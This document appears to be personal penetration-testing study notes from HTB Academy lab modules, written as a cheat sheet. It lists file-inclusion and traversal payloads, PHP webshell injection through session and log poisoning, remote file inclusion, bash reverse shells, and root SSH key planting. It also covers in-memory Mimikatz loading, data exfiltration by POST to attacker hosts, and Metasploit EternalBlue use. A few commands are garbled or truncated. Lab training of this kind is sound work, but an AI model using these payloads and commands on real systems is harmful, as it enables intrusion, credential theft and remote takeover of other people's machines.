# Hacking Lessons









## File Inclusion / Directory Traversal (HTB Academy)
Often see a parameter like /index.php?page=about. Under the hood, index.php will probably pull header.php, about.php, and footer.php. Since you control the about portion of the request, it may be possible to have the webserver grab other files! Another common place is within languages. If you see ?lang=en; then the website will grab files from the /en/ directory.

* RCE through PHP Session Files
Default page url with php and access to logs
> http://46.101.91.21:32430/index.php?language=/var/log/apache2/access.log

May need to put the following before the filename 
../../../../../../../../../
/../../../../../
....//....//....//....//....//....//....//....//
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd


* Cookie retrival and Poison
Get cookie from browser inspector. Then look the cookie up via browser url
> http://46.101.91.21:32430/index.php?language=/var/lib/php/sessions/sess_nvc45a8h12hmm2l2bc1ug3bage
Poison the Cookie 
> http://46.101.91.21:32430/index.php?language=session_poisoning

* Prime the website for code injection
> http://134.209.184.216:32415/index.php?language=<?php system($_GET['cmd']); ?>

* Inject code where id is. Ie cmd=ifconfig
> http://46.101.91.21:32484/index.php?language=/var/lib/php/sessions/sess_nvc45a8h12hmm2l2bc1ug3bage&cmd=id

* Other ways to execude remote code - There is 3
   * Execute code where id is (1)
   > http://46.101.91.21:32484/index.php?language=expect://id
   * Get the base64 digit (2)
   > http://46.101.91.21:32484/index.php?language=expect://echo '<?php system($_GET['cmd']); ?>' | base64
   * Execute command (2)
   > http://46.101.91.21:32484/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
   * Execute code via curl, code goes where id is (3)
   > curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input" | grep uid

* Remote file Inclusion
execute the below command while executing the broswer script http://website.com/index.php?language=http://yourserverip:8080/file
> python3 -m http.server 8080
create a file to call and put the following as contents <?php system($_GET['cmd']); ?>
eg. shell.php 
call the file with url http://website.com/index.php?language=http://yourserverip:8080/shell.php&cmd=id
* FTP RFI can also be done via the below command while executing url http://blog.inlanefreight.com/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
> python -m pyftpdlib -p 21
* Windows RFI 
 can be called via the below command and url as follows http://blog.inlanefreight.com/index.php?language=\\serverIp\share\shell.php&cmd=whoami
> smbserver.py -smb2support share $(pwd)

* Source Code Disclosure via PHP Wrappers
Can be done via the following code 
> php://filter/read=convert.base64-encode/resource=/etc/passwd

> php://filter/read=string.rot13/resource=/etc/passwd

> eg. http://134.209.184.216:32391/extension/index.php?language=php://filter/read=convert.base64-encode/resource=config

Then execute the URL in linux console proceeded by cURL to get the code. eg. cURL http://website:8080 

*Decrypt the code via command 
> echo 'insert-code-here' | base64 -d

* RCE through Log Files
Files will be at /var/log/apache2/access.log, /var/log/nginx/access.log, /var/log/sshd.log, /var/log/mail, and /var/log/vsftpd.log

Start Burp Suite, intercept a request to the page, and send it to Repeater. Next, change the User-Agent header to something else such as Apache Log Poisoning and click Go

Poisoned user agent is visible in the included log file. Modify User-Agent to a PHP shell such as <?php system($_GET['cmd']); ?>

We can now execute OS-level commands by adding a parameter to the GET request. ie GET website.php?page=../../logs.log&cmd=id (id can be any command)




## Java Fundermentals (HTB Academy)
curl http:/SERVER_IP:PORT/	cURL GET request
curl -s http:/SERVER_IP:PORT/ -X POST	cURL POST request
curl -s http:/SERVER_IP:PORT/ -X POST -d "param1=sample"	cURL POST request with data
echo hackthebox | base64	base64 encode
echo ENCODED_B64 | base64 -d	base64 decode
echo hackthebox | xxd -p	hex encode
echo ENCODED_HEX | xxd -p -r	hex decode
echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'	rot13 encode
echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'	rot13 decode
Deobfuscation Websites
Website
Prettier
Beautifier
JSNice
Misc
Command	Description
ctrl+u	Show HTML source code in Firefox







## Linux Fundermentals (HTB Academy)
* System Info Commands
> uname -a - shows OS version

> ifconfig/ip a	- show our IP address

> netstat -rn	- show networks accessible via the VPN

> id - returns users id

> ps -aux | grep ssh - check if a service is running

> systemctl list-units --type=service - list all service

> sudo updatedb && locate xx - looks for a file

> apt-cache show impacket-scripts - show info about a package

> apt list --installed - show installed packages

> dpkg -l - show installed packages

* Download Packages
Git
> git clone https://github.com/craigrachow/OffSec/blob/main

Download and install a package
> dpkg -i strace_4.21-1ubuntu1_amd64.deb

* Setup Reverse Shell
> c -lvnp 1234	Start a nc listener on a local port

* Send a reverse shell from the remote server
> bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'	
> `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f 	/bin/sh -i 2>&1
> `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f 	/bin/bash -i 2>&1

* Connect to a bind shell started on the remote server
> nc 10.10.10.1 1234 	

* Upgrade shell TTY (1 or 2)
> python -c 'import pty; pty.spawn("/bin/bash")' 	Upgrade shell TTY (1)
> ctrl+z then stty raw -echo then fg then enter twice 	Upgrade shell TTY (2)

*	Create a webshell php file
> echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php 

* Execute a command on an uploaded webshell
> curl http://SERVER_IP:PORT/shell.php?cmd=id 	

* Privilege Escalation 	
> ./linpeas.sh 	Run linpeas script to enumerate remote server

> sudo -l 	List available sudo privileges

> sudo -u user /bin/echo Hello World! 	Run a command with sudo
Always perform bash_history or PSReadLine after changing user

> sudo su user - 	Switch to a user (if we have access to sudo su)

PEAS
> git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git

* Cronjob locations  - /etc/crontab /etc/cron.d /var/spool/cron/crontabs/root

* Generate SSH Keys
> ssh private keys /home/user/.ssh/id_rsa or /root/.ssh/id_rsa

Create a new SSH key
> ssh-keygen -f key 	

Add the generated public key to the user
> echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys 	

SSH to the server with the generated private key
> ssh root@10.10.10.10 -i key 









## Metasploit (HTB Academy)
* install searchsploit
> sudo apt install exploitdb -y

* scan for services 
> netcat 10.10.10.10 22

> nmap 10.129.42.253

> nmap -sV -sC -p- 10.129.42.253

> nc -nv 10.129.42.253 21

> nmap -sC -sV -p21 10.10.10.121

> ftp -p 10.129.42.253

> nmap -A -p445 10.129.42.253

> smbclient -N -L \\\\10.129.42.253

> smbclient -U bob \\\\10.129.42.253\\users

* Run scan on exploitable components 
> searchsploit openssh 7.2 - Search for public exploits for a web application

* Using MSF Console
Start the Metasploit Framework 
> msfconsole

> search exploit eternalblue	MSF: Search for public exploits in MSF

> use exploit/windows/smb/ms17_010_psexec	MSF: Start using an MSF module

> show options	MSF: Show required options for an MSF module

> set RHOSTS 10.10.10.40	MSF: Set a value for an MSF module option

> check	MSF: Test if the target server is vulnerable

> exploit	MSF: Run the exploit on the target server is vulnerable






### Nmap (HTB Academy)
netstat -rn
nmap -Pn -sC -sV -oA all_tcp -T4 --reason -vvvvvvvvvv -p- IP
nmap -sS -sC -sV -Pn -p- -T4 -A host ip
nmap -sV --script=smb* host ip

netcat 10.10.10.10 22	Grab banner of an open port
smbclient -N -L \\\\10.129.42.253	List SMB Shares
smbclient \\\\10.129.42.253\\users	Connect to an SMB share
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0	Scan SNMP on an IP
onesixtyone -c dict.txt 10.129.42.254	Brute force SNMP secret string
whatweb 10.129.42.190

nmap -sV --open -oA nibbles_initial_scan <ip address>
nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190
nc -nv 10.129.42.190 22
nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 



## Windows Fundermentals (HTB Academy)
> Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber - get OS version number
wmic os list brief - same as above

> xfreerdp /v:<targetIp> /u:htb-student /p:Password - RDP from unix

Get-Service	PowerShell cmdlet to view running services
> Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl - list running services

> icacls c:\users /grant joe:f	Grant a user full permissions to a directory

> sconfig	Load Server Configuration menu in Windows Server Core


  
  
  
  

* NEW
netstat -rn
ssh user@10.10.10.10
netcat 10.10.10.10 22





## Service Enumeration
nmap -sV -sC -p- 10.129.42.253
nmap -sV -sC -p- 10.129.42.253 	Run an nmap script scan on an IP
locate scripts/citrix 	List various available nmap scripts
nmap --script smb-os-discovery.nse -p445 10.10.10.40 	Run an nmap script on an IP
netcat 10.10.10.10 22 	Grab banner of an open port
smbclient -N -L \\\\10.129.42.253 	List SMB Shares
smbclient \\\\10.129.42.253\\users 	Connect to an SMB share
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 	Scan SNMP on an IP
onesixtyone -c dict.txt 10.129.42.254 	Brute force SNMP secret string







## Web Fundermentals
* Install enumeration lists
> git clone https://github.com/danielmiessler/SecLists
 > sudo apt install seclists -ysudo apt install seclists -y

* Run a directory scan 
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt 
  *Run a sub-domain scan on a website
  > gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt 
 * List potential directories in robots.txt
 > curl 10.10.10.121/robots.txt
 	
* Grab website banner
> curl -IL https://www.inlanefreight.com 	
List details about the webserver/certificates
> whatweb 10.10.10.121 	

 whatweb 10.10.10.121
whatweb --no-errors 10.10.10.0/24
robots.txt

* GET request with cURL
> curl http://inlanefreight.com -v	- Verbose GET request with cURL

> curl http://admin:password@inlanefreight.com/ -vvv	- cURL Basic Auth login

> curl -u admin:password http://inlanefreight.com/ -vvv	Alternate cURL Basic Auth login

curl -u admin:password -L http://inlanefreight.com/	cURL Basic Auth login, follow redirection

curl -u admin:password 'http://inlanefreight.com/search.php?port_code=us'	cURL GET request with parameter

curl -d 'username=admin&password=password' -L http://inlanefreight.com/login.php	POST request with cURL

curl -d 'username=admin&password=password' -L http://inlanefreight.com/login.php -v	Debugging with cURL

curl -d 'username=admin&password=password' -L --cookie-jar /dev/null http://inlanefreight.com/login.php -v	Cookie usage with cURL

curl -d 'username=admin&password=password' -L --cookie-jar cookies.txt http://inlanefreight.com/login.php	cURL with cookie file

curl -H 'Content-Type: application/json' -d '{ "username" : "admin", "password" : "password" }'	cURL specify content type

curl -X OPTIONS http://inlanefreight.com/ -vv	cURL OPTIONS request

curl -X PUT -d @test.txt http://inlanefreight.com/test.txt -vv	File upload with cURL

curl -X DELETE http://inlanefreight.com/test.txt -vv	DELETE method with cURL

ffuf -h	ffuf help
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ	Directory Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ	Extension Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php	Page Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v	Recursive Fuzzing
ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/	Sub-domain Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx	VHost Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx	Parameter Fuzzing - GET
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx	Parameter Fuzzing - POST
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx	Value Fuzzing
Wordlists
Command	Description
/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt	Directory/Page Wordlist
/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt	Extensions Wordlist
/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt	Domain Wordlist
/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt	Parameters Wordlist
Misc
Command	Description
sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'	Add DNS entry
for i in $(seq 1 1000); do echo $i >> ids.txt; done	Create Sequence Wordlist
curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'









## Transferring Files 	

* Download a file with PowerShell
The aliases iwr, curl, and wget can be used instead of Invoke-WebRequest
> (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
> Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1

Instead of downloading to disk, the payload can instead be executed in memory, using Invoke-Expression, or the alias iex.
> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
> Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex

* Upload a file with PowerShell
> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))
> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
> echo <base64> | base64 -d -w 0 > bloodhound.zip


*Download a file using Bitsadmin
> bitsadmin /transfer n http://10.129.34.0/nc.exe C:\Temp\nc.exe	
Download
> Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
Upload
> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql

* Download a file using Certutil
> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe	

*
> 


*
> 


Invoke-WebRequest https://academy.hackthebox.eu/storage/modules/24/upload_win.zip -OutFile upload_win.zip
(New-Object System.Net.WebClient).DownloadFile('https://academy.hackthebox.eu/storage/modules/24/upload_win.zip',"C:\Users\Public\Downloads\PowerView.ps1")
10.129.34.0
https://academy.hackthebox.eu/storage/modules/24/upload_win.zip
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'https://academy.hackthebox.eu/storage/modules/24/upload_win.zip' -Encoding Byte))
Invoke-WebRequest -Uri http://10.129.34.0:443 -Method POST -Body $b64
certutil.exe -verifyctl -split -f http://10.129.34.0/nc.exe	
bitsadmin /transfer n https://academy.hackthebox.eu/storage/modules/24/upload_win.zip C:\Temp\nc.exe

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh	Download a file using Wget
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh	Download a file using cURL
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'	Download a file using PHP
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip	Upload a file using SCP
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe	Download a file using SCP
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"	Invoke-WebRequest using a Chrome User Agent
  
  
python3 -m http.server 8000 	Start a local webserver
wget http://10.10.14.1:8000/linpeas.sh 	Download a file on the remote server from our local machine
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh 	Download a file on the remote server from our local machine
scp linenum.sh user@remotehost:/tmp/linenum.sh 	Transfer a file to the remote server with scp (requires SSH access)
base64 shell -w 0 	Convert a file to base64
echo f0VMR...SNIO...InmDwU | base64 -d > shell 	Convert a file from base64 back to its orig
md5sum shell 	Check the file's md5sum to ensure it converted correctly
